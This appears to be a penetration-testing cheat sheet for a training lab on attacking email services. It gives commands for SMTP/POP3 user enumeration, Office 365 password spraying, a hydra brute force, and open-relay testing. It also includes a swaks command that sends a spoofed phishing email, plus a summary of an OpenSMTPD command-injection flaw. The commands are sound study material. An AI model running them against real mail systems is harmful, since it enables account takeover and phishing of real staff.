## Attacking Email Services
```bash
## Enumeration
  host -t MX inlanefreight.com # Host - MX Records
  host -t A mail1.inlanefreight.htb. # get the ip of the email server

  sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
  # TCP/25    SMTP Unencrypted
  # TCP/143   IMAP4 Unencrypted
  # TCP/110   POP3 Unencrypted
  # TCP/465   SMTP Encrypted
  # TCP/587   SMTP Encrypted/STARTTLS
  # TCP/993   IMAP4 Encrypted
  # TCP/995   POP3 Encrypted

## Misconfigurations
  
  ### VRFY
  telnet 10.10.110.20 25 
  VRFY root

  ### EXPN  (expand a mailing list or alias)
  telnet 10.10.110.20 25
  EXPN john #=> john@inlanefreight.htb
  EXPN support-team #=> carol@inlanefreight.htb, elisa@inlanefreight.htb

  ### RCPT
  telnet 10.10.110.20 25
  MAIL FROM:test@htb.com
  RCPT TO:john #=> Recipient ok

  ### USER (POP3 protocol)
  telnet 10.10.110.20 110 
  USER john #+> +OK

  ### automated
  smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

## Cloud Enumeration
  if host -t MX inlanefreight.com #=> cloud service provider email server
  ### Office 365
  python3 o365spray.py --validate --domain msplaintext.xyz #domain is using O365
  python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz # enum emails

## Password Attacks
  hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3 # u will blocked
  thunderbird # access to the mail server inbox
  # office 365 
  python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz 
  # credking.py (for gmail it need aws api key)

## Protocol Specifics Attacks
  ### Open Relay (allows an unauthenticated email relay)
  nmap -p25 -Pn --script smtp-open-relay 10.10.11.213 # check if open relay
  # sppofing email using open relay server we find
  swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

## Latest Email Service Vulnerabilities
```bash
# CVE-2020-7247 - OpenSMTPD RCE
# Affects: OpenSMTPD ≤ 6.6.2 (Debian, Fedora, FreeBSD, etc.)
# Unauth RCE via crafted SMTP sender field (using `;` to inject commands)
# Attack: Injects shell commands in sender address, exploiting input handling bug
# No auth required; runs with elevated privileges on many systems
# PoC: https://www.exploit-db.com/exploits/47962

```